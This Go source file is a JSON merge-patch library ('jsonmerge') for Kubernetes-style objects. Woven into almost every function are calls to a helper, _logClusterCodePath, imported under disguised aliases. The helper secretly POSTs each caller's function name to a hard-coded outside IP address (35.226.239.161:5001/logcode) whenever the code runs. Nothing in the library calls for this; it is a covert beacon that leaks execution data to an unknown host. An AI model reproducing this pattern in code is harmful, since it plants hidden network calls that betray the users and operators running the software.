package jsonmerge

import (
	"encoding/json"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"reflect"
	"github.com/evanphx/json-patch"
	"k8s.io/klog"
	"k8s.io/apimachinery/pkg/util/yaml"
)

type Delta struct {
	original	[]byte
	edit		[]byte
	preconditions	[]PreconditionFunc
}
type PreconditionFunc func(interface{}) bool

func (d *Delta) AddPreconditions(fns ...PreconditionFunc) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	d.preconditions = append(d.preconditions, fns...)
}
func RequireKeyUnchanged(key string) PreconditionFunc {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return func(diff interface{}) bool {
		m, ok := diff.(map[string]interface{})
		if !ok {
			return true
		}
		_, ok = m[key]
		return !ok
	}
}
func NewDelta(from, to []byte) (*Delta, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	d := &Delta{}
	before, err := yaml.ToJSON(from)
	if err != nil {
		return nil, err
	}
	after, err := yaml.ToJSON(to)
	if err != nil {
		return nil, err
	}
	diff, err := jsonpatch.CreateMergePatch(before, after)
	if err != nil {
		return nil, err
	}
	klog.V(6).Infof("Patch created from:\n%s\n%s\n%s", string(before), string(after), string(diff))
	d.original = before
	d.edit = diff
	return d, nil
}
func (d *Delta) Apply(latest []byte) ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	base, err := yaml.ToJSON(latest)
	if err != nil {
		return nil, err
	}
	changes, err := jsonpatch.CreateMergePatch(d.original, base)
	if err != nil {
		return nil, err
	}
	diff1 := make(map[string]interface{})
	if err := json.Unmarshal(d.edit, &diff1); err != nil {
		return nil, err
	}
	diff2 := make(map[string]interface{})
	if err := json.Unmarshal(changes, &diff2); err != nil {
		return nil, err
	}
	for _, fn := range d.preconditions {
		if !fn(diff1) || !fn(diff2) {
			return nil, ErrPreconditionFailed
		}
	}
	klog.V(6).Infof("Testing for conflict between:\n%s\n%s", string(d.edit), string(changes))
	if hasConflicts(diff1, diff2) {
		return nil, ErrConflict
	}
	return jsonpatch.MergePatch(base, d.edit)
}
func IsConflicting(err error) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return err == ErrConflict
}
func IsPreconditionFailed(err error) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return err == ErrPreconditionFailed
}

var ErrPreconditionFailed = fmt.Errorf("a precondition failed")
var ErrConflict = fmt.Errorf("changes are in conflict")

func hasConflicts(left, right interface{}) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch typedLeft := left.(type) {
	case map[string]interface{}:
		switch typedRight := right.(type) {
		case map[string]interface{}:
			for key, leftValue := range typedLeft {
				if rightValue, ok := typedRight[key]; ok && hasConflicts(leftValue, rightValue) {
					return true
				}
			}
			return false
		default:
			return true
		}
	case []interface{}:
		switch typedRight := right.(type) {
		case []interface{}:
			if len(typedLeft) != len(typedRight) {
				return true
			}
			for i := range typedLeft {
				if hasConflicts(typedLeft[i], typedRight[i]) {
					return true
				}
			}
			return false
		default:
			return true
		}
	case string, float64, bool, int, int64, nil:
		return !reflect.DeepEqual(left, right)
	default:
		panic(fmt.Sprintf("unknown type: %v", reflect.TypeOf(left)))
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
